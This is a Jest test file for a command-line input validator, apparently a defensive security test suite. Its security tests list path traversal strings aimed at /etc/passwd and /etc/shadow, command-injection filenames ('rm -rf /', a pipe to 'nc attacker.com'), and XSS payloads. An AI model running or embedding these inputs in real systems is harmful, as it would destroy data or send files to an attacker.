/**
 * Tests for CLI Argument Validator
 */
import { describe, test, expect, beforeEach, jest } from '@jest/globals';
import path from 'path';

// Mock logger to prevent console output
jest.mock('../../../utils/logger.js', () => ({
  default: {
    error: jest.fn(),
    info: jest.fn(),
    warn: jest.fn(),
    debug: jest.fn()
  }
}));

import {
  validateFilePath,
  validateFlags,
  sanitizeString,
  parseIngestArgs
} from '../../../utils/cli-validator.js';

describe('CLI Validator', () => {
  describe('validateFilePath', () => {
    test('should accept valid file paths', () => {
      const result = validateFilePath('./data/test.json', {
        extensions: ['.json']
      });

      expect(result).toContain('data');
      expect(result).toContain('test.json');
      expect(path.isAbsolute(result)).toBe(true);
    });

    test('should reject path traversal attempts', () => {
      expect(() =>
        validateFilePath('../../../etc/passwd', {
          basePath: '/safe/directory'
        })
      ).toThrow('outside allowed directory');
    });

    test('should reject null byte injection', () => {
      expect(() =>
        validateFilePath('file.json\0.txt')
      ).toThrow('null bytes');
    });

    test('should validate file extensions', () => {
      expect(() =>
        validateFilePath('test.txt', {
          extensions: ['.json']
        })
      ).toThrow('Invalid file extension');
    });

    test('should handle absolute paths within base directory', () => {
      const basePath = process.cwd();
      const testPath = path.join(basePath, 'data', 'test.json');

      const result = validateFilePath(testPath, {
        basePath,
        extensions: ['.json']
      });

      expect(result).toBe(testPath);
    });

    test('should reject empty or invalid paths', () => {
      expect(() => validateFilePath('')).toThrow('non-empty string');
      expect(() => validateFilePath(null)).toThrow('non-empty string');
      expect(() => validateFilePath(123)).toThrow('non-empty string');
    });
  });

  describe('validateFlags', () => {
    test('should accept allowed flags', () => {
      const flags = validateFlags(
        ['--dry-run', '--verbose'],
        ['--dry-run', '--verbose', '--debug']
      );

      expect(flags.has('--dry-run')).toBe(true);
      expect(flags.has('--verbose')).toBe(true);
      expect(flags.size).toBe(2);
    });

    test('should reject unknown flags', () => {
      expect(() =>
        validateFlags(
          ['--malicious-flag'],
          ['--dry-run', '--verbose']
        )
      ).toThrow('Invalid flag: --malicious-flag');
    });

    test('should ignore non-flag arguments', () => {
      const flags = validateFlags(
        ['file.json', '--dry-run', 'another-file'],
        ['--dry-run']
      );

      expect(flags.has('--dry-run')).toBe(true);
      expect(flags.size).toBe(1);
    });
  });

  describe('sanitizeString', () => {
    test('should accept valid strings', () => {
      const result = sanitizeString('valid-string-123', {
        pattern: /^[a-z0-9-]+$/
      });

      expect(result).toBe('valid-string-123');
    });

    test('should truncate long strings', () => {
      const longString = 'a'.repeat(200);
      const result = sanitizeString(longString, {
        maxLength: 100
      });

      expect(result.length).toBe(100);
    });

    test('should remove null bytes', () => {
      const result = sanitizeString('test\0string');
      expect(result).toBe('teststring');
    });

    test('should validate against pattern', () => {
      expect(() =>
        sanitizeString('invalid@chars!', {
          pattern: /^[a-zA-Z0-9]+$/
        })
      ).toThrow('does not match required pattern');
    });

    test('should reject non-strings', () => {
      expect(() => sanitizeString(123)).toThrow('must be a string');
      expect(() => sanitizeString(null)).toThrow('must be a string');
    });
  });

  describe('parseIngestArgs', () => {
    test('should parse file path and flags', () => {
      const argv = ['node', 'script.js', 'data/test.json', '--dry-run'];

      const result = parseIngestArgs(argv, {
        allowedFlags: ['--dry-run'],
        fileExtensions: ['.json']
      });

      expect(result.filePath).toContain('test.json');
      expect(result.hasFlag('--dry-run')).toBe(true);
    });

    test('should handle flags without file path', () => {
      const argv = ['node', 'script.js', '--skip-validation', '--dry-run'];

      const result = parseIngestArgs(argv, {
        allowedFlags: ['--skip-validation', '--dry-run']
      });

      expect(result.filePath).toBe(null);
      expect(result.hasFlag('--skip-validation')).toBe(true);
      expect(result.hasFlag('--dry-run')).toBe(true);
    });

    test('should reject invalid flags', () => {
      const argv = ['node', 'script.js', '--evil-flag'];

      expect(() =>
        parseIngestArgs(argv, {
          allowedFlags: ['--dry-run']
        })
      ).toThrow('Invalid flag: --evil-flag');
    });

    test('should validate file extensions', () => {
      const argv = ['node', 'script.js', 'data.txt'];

      expect(() =>
        parseIngestArgs(argv, {
          fileExtensions: ['.json']
        })
      ).toThrow('Invalid file extension');
    });
  });

  describe('Security Tests', () => {
    test('should prevent directory traversal attacks', () => {
      const attacks = [
        '../../../etc/passwd',
        'data/../../secret.txt',
        './data/../../../etc/shadow'
      ];

      // These should definitely be caught as traversal attacks
      attacks.forEach(attack => {
        expect(() =>
          validateFilePath(attack, {
            basePath: '/safe/dir'
          })
        ).toThrow('outside allowed directory');
      });

      // Platform-specific edge cases that may be handled differently
      // On Unix, backslash paths and tilde paths may be treated as literal filenames
      const platformSpecificAttacks = [
        '..\\..\\..\\windows\\system32',  // Windows-style on Unix
        '~/../etc/passwd'  // Tilde doesn't expand in Node.js path.resolve
      ];

      platformSpecificAttacks.forEach(attack => {
        // Either it should throw OR it should treat it as a literal filename
        try {
          const result = validateFilePath(attack, {
            basePath: '/safe/dir'
          });
          // If it doesn't throw, verify it's treating it as a literal filename
          // (i.e., not actually traversing)
          expect(result.startsWith('/safe/dir')).toBe(true);
        } catch (err) {
          // If it throws, that's also acceptable security behavior
          expect(err.message).toContain('outside allowed directory');
        }
      });
    });

    test('should handle symbolic link attacks safely', () => {
      // Test that resolved path is checked, not just the input
      const symlinkedPath = './data/symlink/../../../etc/passwd';

      expect(() =>
        validateFilePath(symlinkedPath, {
          basePath: process.cwd()
        })
      ).toThrow();
    });

    test('should prevent command injection via filenames', () => {
      const maliciousNames = [
        'file.json; rm -rf /',
        'file.json && cat /etc/passwd',
        'file.json | nc attacker.com 1234',
        'file$(whoami).json',
        'file`id`.json'
      ];

      // These should be safely handled as literal filenames
      maliciousNames.forEach(name => {
        // Should either accept as literal filename or reject for invalid chars
        // but never execute commands
        const result = validateFilePath(name, {
          mustExist: false
        });

        // The path should be treated literally
        // The result will be an absolute path, so check that it ends with the malicious name
        // (minus the trailing slash if present)
        const expectedEnding = name.endsWith('/') ? name.slice(0, -1) : name;
        expect(result.endsWith(expectedEnding)).toBe(true);
      });
    });

    test('should sanitize inputs to prevent XSS', () => {
      const xssAttempts = [
        '<script>alert("xss")</script>',
        'javascript:alert(1)',
        'onerror=alert(1)',
        '<img src=x onerror=alert(1)>'
      ];

      xssAttempts.forEach(xss => {
        // Should reject due to invalid pattern
        expect(() =>
          sanitizeString(xss, {
            pattern: /^[a-zA-Z0-9-_ ]+$/
          })
        ).toThrow('does not match required pattern');
      });
    });
  });
});